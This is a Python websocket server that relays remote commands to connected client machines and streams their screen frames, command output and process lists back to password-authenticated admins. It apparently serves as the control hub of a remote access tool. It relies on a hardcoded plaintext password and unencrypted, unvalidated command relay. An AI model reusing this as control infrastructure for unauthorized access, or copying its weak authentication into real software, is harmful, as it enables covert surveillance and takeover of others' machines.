import asyncio
import websockets
import json

clients = {}  # client_id -> websocket
admins = set()
PASSWORD = "supersecurepassword"

async def handler(websocket, path):
    client_id = None
    try:
        async for message in websocket:
            data = json.loads(message)
            msg_type = data.get("type")

            # Admin Login
            if path == "/ws/admin/":
                if msg_type == "auth":
                    if data.get("password") == PASSWORD:
                        admins.add(websocket)
                        await websocket.send(json.dumps({"type": "auth_success"}))
                        for cid in clients:
                            await websocket.send(json.dumps({"type": "client_connected", "client_id": cid}))
                    else:
                        await websocket.send(json.dumps({"type": "auth_failed"}))
                        return await safe_close(websocket)

                elif msg_type == "command":
                    target_id = data.get("target")
                    command = data.get("command")
                    if target_id in clients:
                        await clients[target_id].send(json.dumps(command))

            # Client Verbindung
            elif path.startswith("/ws/client/"):
                client_id = path.split("/")[-1]
                clients[client_id] = websocket
                print(f"[+] Client connected: {client_id}")
                for admin in admins:
                    await admin.send(json.dumps({"type": "client_connected", "client_id": client_id}))

            # Weiterleitung
            if msg_type in ("screen_frame", "cmd_result", "process_list"):
                for admin in admins:
                    await admin.send(json.dumps(data))

    except websockets.exceptions.ConnectionClosed:
        print("[-] Verbindung geschlossen")

    finally:
        if path.startswith("/ws/client/") and client_id:
            if clients.get(client_id) == websocket:
                del clients[client_id]
            for admin in admins:
                try:
                    await admin.send(json.dumps({"type": "client_disconnected", "client_id": client_id}))
                except:
                    pass
        elif path == "/ws/admin/":
            admins.discard(websocket)
        await safe_close(websocket)

async def safe_close(ws):
    try:
        if not ws.closed:
            await ws.close()
    except:
        pass

async def main():
    print("✅ Server gestartet auf ws://0.0.0.0:10000")
    async with websockets.serve(handler, "0.0.0.0", 10000):
        await asyncio.Future()

if __name__ == "__main__":
    asyncio.run(main())
